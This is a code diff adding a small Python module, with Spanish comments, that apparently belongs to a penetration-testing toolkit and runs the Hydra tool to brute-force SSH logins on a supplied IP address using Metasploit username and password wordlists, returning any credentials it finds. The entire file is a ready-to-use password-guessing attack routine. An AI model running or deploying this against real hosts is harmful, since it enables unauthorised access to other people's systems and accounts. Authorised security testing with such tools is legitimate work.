@@ -1,0 +1,20 @@
+import subprocess
+
+def run(ip):
+    print("   ↳ [Hydra Pro] Evaluando robustez de contraseñas de red...")
+    try:
+        # Lanza Hydra de forma nativa usando un diccionario base de Kali
+        comando = [
+            "hydra", "-L", "/usr/share/wordlists/metasploit/namelist.txt", 
+            "-P", "/usr/share/wordlists/metasploit/password.lst", 
+            f"ssh://{ip}", "-t", "4", "-f"
+        ]
+        resultado = subprocess.run(comando, capture_output=True, text=True, timeout=45)
+
+        if "login:" in resultado.stdout.lower():
+            return f"[🚨] ¡ACCESO REVELADO POR FUERZA BRUTA!\n{resultado.stdout.strip()}"
+        return "[-] No se detectaron credenciales débiles por defecto en los accesos remotos."
+    except FileNotFoundError:
+        return "[-] Hydra no está instalado o accesible en este sistema Kali."
+    except Exception:
+        return "[-] El servicio SSH no respondió o el escaneo fue mitigado."
